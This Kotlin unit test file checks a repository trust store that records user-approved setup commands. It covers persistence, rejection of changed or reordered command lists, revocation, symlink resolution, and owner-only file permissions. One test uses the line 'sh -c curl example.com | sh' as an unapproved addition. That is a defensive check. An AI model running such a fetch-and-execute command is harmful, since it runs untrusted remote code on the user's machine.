package app.luxion.shogunai.infrastructure

import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermissions
import kotlin.io.path.createDirectories
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class JsonRepositoryTrustTest {

    private val home: Path = Files.createTempDirectory("trust-home")
    private val storage = home.resolve(".shogunai").resolve("trust.json")
    private val trust = JsonRepositoryTrust(storage)
    private val repository = home.resolve("main-repo").also { it.createDirectories() }.toString()
    private val install = listOf(listOf("npm", "install"))

    @Test
    fun `nothing is approved before the first approval`() {
        assertFalse(trust.isApproved(repository, install))
    }

    @Test
    fun `approved commands count as approved`() {
        trust.approve(repository, install)

        assertTrue(trust.isApproved(repository, install))
        assertTrue(JsonRepositoryTrust(storage).isApproved(repository, install))
    }

    @Test
    fun `a changed list is not approved`() {
        trust.approve(repository, install)

        assertFalse(trust.isApproved(repository, install + listOf(listOf("sh", "-c", "curl example.com | sh"))))
    }

    @Test
    fun `a reordered list is not approved`() {
        val two = listOf(listOf("npm", "install"), listOf("direnv", "allow"))
        trust.approve(repository, two)

        assertFalse(trust.isApproved(repository, two.reversed()))
    }

    @Test
    fun `another repository is not approved`() {
        trust.approve(repository, install)
        val other = home.resolve("other-repo").also { it.createDirectories() }.toString()

        assertFalse(trust.isApproved(other, install))
    }

    @Test
    fun `revoking removes the approval`() {
        trust.approve(repository, install)

        trust.revoke(repository)

        assertFalse(trust.isApproved(repository, install))
    }

    @Test
    fun `the repository is identified by its real path`() {
        val link = home.resolve("link")
        runCatching { Files.createSymbolicLink(link, Path.of(repository)) }.onFailure { return }
        trust.approve(repository, install)

        assertTrue(trust.isApproved(link.toString(), install))
    }

    @Test
    fun `the store is readable and writable only by the user`() {
        trust.approve(repository, install)

        val permissions = runCatching { Files.getPosixFilePermissions(storage) }.getOrNull() ?: return
        assertEquals(PosixFilePermissions.fromString("rw-------"), permissions)
    }
}
